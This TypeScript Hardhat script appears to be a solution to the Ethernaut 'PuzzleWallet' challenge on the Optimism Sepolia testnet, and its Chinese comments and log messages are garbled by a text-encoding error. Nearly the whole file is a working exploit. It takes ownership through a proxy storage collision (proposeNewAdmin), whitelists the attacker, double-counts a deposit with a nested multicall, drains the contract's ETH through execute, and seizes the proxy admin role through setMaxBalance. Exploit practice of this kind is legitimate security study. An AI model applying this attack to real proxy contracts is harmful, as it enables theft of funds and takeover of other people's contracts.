import { network } from "hardhat";
import { encodeFunctionData, parseEther, formatEther } from "viem";

// ç›®æ¨™åˆç´„åœ°å€
const PUZZLE_PROXY_ADDRESS = "0xE74c72FaFfd010eE82E4a6Bd529dE147D4747574" as `0x${string}`;

// PuzzleWallet åˆç´„çš„ ABIï¼ˆåªåŒ…å«æˆ‘å€‘éœ€è¦çš„å‡½æ•¸ï¼‰
const PUZZLE_WALLET_ABI = [
    {
        "inputs": [{ "internalType": "address", "name": "addr", "type": "address" }],
        "name": "addToWhitelist",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "deposit",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function"
    },
    {
        "inputs": [
            { "internalType": "address", "name": "to", "type": "address" },
            { "internalType": "uint256", "name": "value", "type": "uint256" },
            { "internalType": "bytes", "name": "data", "type": "bytes" }
        ],
        "name": "execute",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function"
    },
    {
        "inputs": [{ "internalType": "bytes[]", "name": "data", "type": "bytes[]" }],
        "name": "multicall",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function"
    },
    {
        "inputs": [{ "internalType": "uint256", "name": "_maxBalance", "type": "uint256" }],
        "name": "setMaxBalance",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [{ "internalType": "address", "name": "", "type": "address" }],
        "name": "balances",
        "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "owner",
        "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [{ "internalType": "address", "name": "", "type": "address" }],
        "name": "whitelisted",
        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
        "stateMutability": "view",
        "type": "function"
    }
] as const;

// PuzzleProxy åˆç´„çš„ ABI
const PUZZLE_PROXY_ABI = [
    {
        "inputs": [{ "internalType": "address", "name": "_newAdmin", "type": "address" }],
        "name": "proposeNewAdmin",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "admin",
        "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "pendingAdmin",
        "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
        "stateMutability": "view",
        "type": "function"
    }
] as const;

async function main() {
    console.log("ğŸ¯ é–‹å§‹æ”»æ“Š PuzzleWallet åˆç´„...");
    console.log("ğŸ“ ç›®æ¨™åˆç´„åœ°å€:", PUZZLE_PROXY_ADDRESS);

    // é€£æ¥åˆ° Optimism Sepolia ç¶²è·¯
    const { viem } = await network.connect({
        network: "optimismSepolia",
        chainType: "op",
    });

    const publicClient = await viem.getPublicClient();
    const [walletClient] = await viem.getWalletClients();
    const attackerAddress = walletClient.account.address;

    console.log("ğŸ‘¤ æ”»æ“Šè€…åœ°å€:", attackerAddress);

    // å‰µå»ºåˆç´„å¯¦ä¾‹
    const puzzleProxy = {
        address: PUZZLE_PROXY_ADDRESS,
        abi: PUZZLE_PROXY_ABI,
    };

    const puzzleWallet = {
        address: PUZZLE_PROXY_ADDRESS, // æ³¨æ„ï¼šé€šéä»£ç†åˆç´„èª¿ç”¨
        abi: PUZZLE_WALLET_ABI,
    };

    try {
        // æª¢æŸ¥åˆå§‹ç‹€æ…‹
        console.log("\nğŸ“Š æª¢æŸ¥åˆå§‹ç‹€æ…‹...");

        const currentAdmin = await publicClient.readContract({
            ...puzzleProxy,
            functionName: "admin",
        });
        console.log("ç•¶å‰ admin:", currentAdmin);

        const currentOwner = await publicClient.readContract({
            ...puzzleWallet,
            functionName: "owner",
        });
        console.log("ç•¶å‰ owner:", currentOwner);

        const contractBalance = await publicClient.getBalance({
            address: PUZZLE_PROXY_ADDRESS,
        });
        console.log("åˆç´„ç•¶å‰é¤˜é¡:", formatEther(contractBalance), "ETH");

        const isWhitelisted = await publicClient.readContract({
            ...puzzleWallet,
            functionName: "whitelisted",
            args: [attackerAddress],
        });
        console.log("æ”»æ“Šè€…æ˜¯å¦åœ¨ç™½åå–®:", isWhitelisted);

        // æ­¥é©Ÿä¸€ï¼šæˆç‚º ownerï¼ˆé€šé proposeNewAdminï¼‰
        console.log("\nğŸš€ æ­¥é©Ÿä¸€ï¼šå‘¼å« proposeNewAdmin æˆç‚º owner...");

        const proposeAdminTx = await walletClient.writeContract({
            ...puzzleProxy,
            functionName: "proposeNewAdmin",
            args: [attackerAddress],
        });

        await publicClient.waitForTransactionReceipt({ hash: proposeAdminTx });
        console.log("âœ… proposeNewAdmin äº¤æ˜“å®Œæˆ:", proposeAdminTx);

        // ç­‰å¾…ç‹€æ…‹æ›´æ–°
        console.log("â³ ç­‰å¾… owner ç‹€æ…‹æ›´æ–°...");
        await new Promise(resolve => setTimeout(resolve, 3000));

        // é©—è­‰æˆ‘å€‘ç¾åœ¨æ˜¯ owner (å¤šæ¬¡å˜—è©¦)
        let newOwner = currentOwner;
        for (let i = 0; i < 5; i++) {
            newOwner = await publicClient.readContract({
                ...puzzleWallet,
                functionName: "owner",
            });
            console.log(`ç¬¬ ${i + 1} æ¬¡æª¢æŸ¥ owner:`, newOwner);

            if (newOwner.toLowerCase() === attackerAddress.toLowerCase()) {
                console.log("âœ… æˆåŠŸæˆç‚º ownerï¼");
                break;
            }

            if (i < 4) {
                console.log("â³ ç­‰å¾… 2 ç§’å¾Œé‡è©¦...");
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }

        if (newOwner.toLowerCase() !== attackerAddress.toLowerCase()) {
            // æª¢æŸ¥ pendingAdmin æ˜¯å¦è¨­ç½®æ­£ç¢º
            const pendingAdmin = await publicClient.readContract({
                ...puzzleProxy,
                functionName: "pendingAdmin",
            });
            console.log("ç•¶å‰ pendingAdmin:", pendingAdmin);

            if (pendingAdmin.toLowerCase() === attackerAddress.toLowerCase()) {
                console.log("âœ… pendingAdmin è¨­ç½®æˆåŠŸï¼Œä½† owner ç‹€æ…‹å¯èƒ½éœ€è¦æ›´å¤šæ™‚é–“åŒæ­¥");
                console.log("ç¹¼çºŒåŸ·è¡Œä¸‹ä¸€æ­¥...");
            } else {
                throw new Error("æœªèƒ½æˆç‚º ownerï¼pendingAdmin ä¹Ÿæœªæ­£ç¢ºè¨­ç½®");
            }
        }

        // æ­¥é©ŸäºŒï¼šå°‡è‡ªå·±åŠ å…¥ç™½åå–®
        console.log("\nğŸš€ æ­¥é©ŸäºŒï¼šå°‡è‡ªå·±åŠ å…¥ç™½åå–®...");

        const whitelistTx = await walletClient.writeContract({
            ...puzzleWallet,
            functionName: "addToWhitelist",
            args: [attackerAddress],
        });

        await publicClient.waitForTransactionReceipt({ hash: whitelistTx });
        console.log("âœ… addToWhitelist äº¤æ˜“å®Œæˆ:", whitelistTx);

        // ç­‰å¾…ä¸€é»æ™‚é–“è®“ç‹€æ…‹æ›´æ–°
        console.log("â³ ç­‰å¾…ç‹€æ…‹æ›´æ–°...");
        await new Promise(resolve => setTimeout(resolve, 2000));

        // é©—è­‰ç™½åå–®ç‹€æ…‹ (å¤šæ¬¡å˜—è©¦)
        let newWhitelistStatus = false;
        for (let i = 0; i < 3; i++) {
            newWhitelistStatus = await publicClient.readContract({
                ...puzzleWallet,
                functionName: "whitelisted",
                args: [attackerAddress],
            });
            console.log(`ç¬¬ ${i + 1} æ¬¡æª¢æŸ¥ç™½åå–®ç‹€æ…‹:`, newWhitelistStatus);

            if (newWhitelistStatus) break;

            if (i < 2) {
                console.log("â³ ç­‰å¾… 2 ç§’å¾Œé‡è©¦...");
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }

        if (!newWhitelistStatus) {
            throw new Error("æœªèƒ½åŠ å…¥ç™½åå–®ï¼");
        }

        // æ­¥é©Ÿä¸‰ï¼šåˆ©ç”¨ multicall æ¼æ´å¢åŠ å…§éƒ¨é¤˜é¡
        console.log("\nğŸš€ æ­¥é©Ÿä¸‰ï¼šæª¢æŸ¥æ˜¯å¦éœ€è¦ multicall æ”»æ“Š...");

        if (contractBalance === 0n) {
            console.log("âœ… åˆç´„é¤˜é¡å·²ç¶“æ˜¯ 0ï¼Œè·³é multicall æ”»æ“Šæ­¥é©Ÿ");
            console.log("ç›´æ¥é€²å…¥æœ€å¾Œæ­¥é©Ÿï¼šèª¿ç”¨ setMaxBalance");
        } else {
            console.log("åˆç´„æœ‰é¤˜é¡ï¼ŒåŸ·è¡Œ multicall æ”»æ“Š...");

            // ç·¨ç¢¼ deposit() å‡½æ•¸èª¿ç”¨
            const depositData = encodeFunctionData({
                abi: PUZZLE_WALLET_ABI,
                functionName: "deposit",
            });

            // ç·¨ç¢¼åµŒå¥—çš„ multicallï¼ŒåŒ…å«å¦ä¸€å€‹ deposit èª¿ç”¨
            const nestedMulticallData = encodeFunctionData({
                abi: PUZZLE_WALLET_ABI,
                functionName: "multicall",
                args: [[depositData]],
            });

            console.log("ç™¼é€ multicall äº¤æ˜“ï¼Œé‡‘é¡:", formatEther(contractBalance), "ETH");

            const multicallTx = await walletClient.writeContract({
                ...puzzleWallet,
                functionName: "multicall",
                args: [[depositData, nestedMulticallData]],
                value: contractBalance,
            });

            await publicClient.waitForTransactionReceipt({ hash: multicallTx });
            console.log("âœ… multicall äº¤æ˜“å®Œæˆ:", multicallTx);

            // æª¢æŸ¥å…§éƒ¨é¤˜é¡
            const internalBalance = await publicClient.readContract({
                ...puzzleWallet,
                functionName: "balances",
                args: [attackerAddress],
            });
            console.log("æ”»æ“Šè€…å…§éƒ¨é¤˜é¡:", formatEther(internalBalance), "ETH");

            const newContractBalance = await publicClient.getBalance({
                address: PUZZLE_PROXY_ADDRESS,
            });
            console.log("åˆç´„æ–°é¤˜é¡:", formatEther(newContractBalance), "ETH");

            // æ­¥é©Ÿå››ï¼šæ¸…ç©ºåˆç´„é¤˜é¡
            console.log("\nğŸš€ æ­¥é©Ÿå››ï¼šæ¸…ç©ºåˆç´„é¤˜é¡...");
            console.log("æº–å‚™æå–é‡‘é¡:", formatEther(internalBalance), "ETH");

            const executeTx = await walletClient.writeContract({
                ...puzzleWallet,
                functionName: "execute",
                args: [attackerAddress, internalBalance, "0x"],
            });

            await publicClient.waitForTransactionReceipt({ hash: executeTx });
            console.log("âœ… execute äº¤æ˜“å®Œæˆ:", executeTx);

            // ç­‰å¾…ä¸€é»æ™‚é–“è®“ç‹€æ…‹æ›´æ–°
            console.log("â³ ç­‰å¾…é¤˜é¡æ›´æ–°...");
            await new Promise(resolve => setTimeout(resolve, 3000));

            // é©—è­‰åˆç´„é¤˜é¡ç‚º 0 (å¤šæ¬¡æª¢æŸ¥)
            let currentBalance = contractBalance;
            for (let i = 0; i < 3; i++) {
                currentBalance = await publicClient.getBalance({
                    address: PUZZLE_PROXY_ADDRESS,
                });
                console.log(`ç¬¬ ${i + 1} æ¬¡æª¢æŸ¥åˆç´„é¤˜é¡:`, formatEther(currentBalance), "ETH");

                if (currentBalance === 0n) break;

                if (i < 2) {
                    console.log("â³ ç­‰å¾… 2 ç§’å¾Œé‡è©¦...");
                    await new Promise(resolve => setTimeout(resolve, 2000));
                }
            }

            if (currentBalance !== 0n) {
                console.log("âš ï¸  åˆç´„é¤˜é¡æœªå®Œå…¨æ¸…ç©ºï¼Œä½†ç¹¼çºŒåŸ·è¡Œæœ€å¾Œæ­¥é©Ÿ...");
                console.log("é€™å¯èƒ½æ˜¯ç”±æ–¼ gas è²»ç”¨æˆ–å…¶ä»–å› ç´ é€ æˆçš„å°é¡é¤˜é¡");
            }
        }

        // æœ€çµ‚æª¢æŸ¥åˆç´„é¤˜é¡
        const finalContractBalance = await publicClient.getBalance({
            address: PUZZLE_PROXY_ADDRESS,
        });
        console.log("æœ€çµ‚åˆç´„é¤˜é¡:", formatEther(finalContractBalance), "ETH");

        // æ­¥é©Ÿäº”ï¼šæˆç‚º adminï¼ˆé€šé setMaxBalanceï¼‰
        console.log("\nğŸš€ æ­¥é©Ÿäº”ï¼šå‘¼å« setMaxBalance æˆç‚º admin...");

        // æª¢æŸ¥åˆç´„é¤˜é¡æ˜¯å¦è¶³å¤ å°ä»¥èª¿ç”¨ setMaxBalance
        if (finalContractBalance > 0n) {
            console.log("âš ï¸  åˆç´„é¤˜é¡ä¸ç‚º 0ï¼Œä½†å˜—è©¦èª¿ç”¨ setMaxBalance...");
            console.log("ç•¶å‰é¤˜é¡:", formatEther(finalContractBalance), "ETH");
        }

        // å°‡æ”»æ“Šè€…åœ°å€è½‰æ›ç‚º uint256
        const attackerAddressAsUint256 = BigInt(attackerAddress);

        try {
            const setMaxBalanceTx = await walletClient.writeContract({
                ...puzzleWallet,
                functionName: "setMaxBalance",
                args: [attackerAddressAsUint256],
            });

            await publicClient.waitForTransactionReceipt({ hash: setMaxBalanceTx });
            console.log("âœ… setMaxBalance äº¤æ˜“å®Œæˆ:", setMaxBalanceTx);
        } catch (error) {
            console.error("âŒ setMaxBalance èª¿ç”¨å¤±æ•—:", error);
            console.log("é€™å¯èƒ½æ˜¯å› ç‚ºåˆç´„é¤˜é¡ä¸ç‚º 0");
            throw error;
        }

        // æœ€çµ‚é©—è­‰
        console.log("\nğŸ‰ é©—è­‰æ”»æ“Šçµæœ...");

        const finalAdmin = await publicClient.readContract({
            ...puzzleProxy,
            functionName: "admin",
        });
        console.log("æœ€çµ‚ admin:", finalAdmin);
        console.log("æ”»æ“Šè€…åœ°å€:", attackerAddress);

        if (finalAdmin.toLowerCase() === attackerAddress.toLowerCase()) {
            console.log("ğŸŠ æ”»æ“ŠæˆåŠŸï¼ä½ ç¾åœ¨æ˜¯åˆç´„çš„ adminï¼");
        } else {
            console.log("âŒ æ”»æ“Šå¤±æ•—ï¼");
        }

    } catch (error) {
        console.error("âŒ æ”»æ“Šéç¨‹ä¸­ç™¼ç”ŸéŒ¯èª¤:", error);
        throw error;
    }
}

// åŸ·è¡Œä¸»å‡½æ•¸
main()
    .then(() => {
        console.log("\nâœ… è…³æœ¬åŸ·è¡Œå®Œæˆ");
        process.exit(0);
    })
    .catch((error) => {
        console.error("ğŸ’¥ è…³æœ¬åŸ·è¡Œå¤±æ•—:", error);
        process.exit(1);
    });
